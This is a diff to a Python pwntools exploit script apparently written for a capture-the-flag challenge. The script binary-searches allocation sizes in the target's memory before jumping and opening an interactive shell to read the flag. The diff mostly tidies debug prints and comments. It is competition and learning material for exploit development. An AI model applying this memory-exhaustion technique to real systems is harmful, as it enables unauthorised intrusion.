@@ -1,3 +1,8 @@
+'''
+Note: If testing locally don't forget "echo 1 > /proc/sys/vm/overcommit_memory",
+otherwise all large allocations will fail.
+'''
+
 from pwn import *
 
 LOCAL = True
@@ -9,7 +14,6 @@ else:
 
 # fill lower memory between code and libraries
 for i in range(1):
-    print 'Allocation ' + str(i)
     print io.recvuntil('[a]lloc, [j]ump : ')
     io.send('a\n')
     print io.recvuntil('sz? ')
@@ -22,14 +26,14 @@ min1 = 2**42
 max1 = 2**47
 binDif = (max1-min1)/2 + min1
 
-io.recvuntil('[a]lloc, [j]ump : ')
+print io.recvuntil('[a]lloc, [j]ump : ')
 prev = 0
 
 # Perform binary search until max allocation size is found
 for i in range(10000):
     # Debug print
-    if (i%3 == 0):
-        print 'Bindif is: ' + hex(binDif)
+    #if (i%3 == 0):
+    #    print 'Bindif is: ' + hex(binDif)
 
     # Create allocation of size binDif
     io.send('a\n')
@@ -37,7 +41,7 @@ for i in range(10000):
     io.send(str(binDif)+'\n')
     str1 = io.recv(4)
 
-    # The allocation is smaller than the largest free space in the program
+    # The allocation is larger than the largest free space in the program
     if (str1 == 'FAIL'):
         #print 'Too big!'
         io.recvuntil('[a]lloc, [j]ump : ')
@@ -72,4 +76,3 @@ io.send(str(binDif)+'\n')
 
 # cat that flag!
 io.interactive()
-io.close()
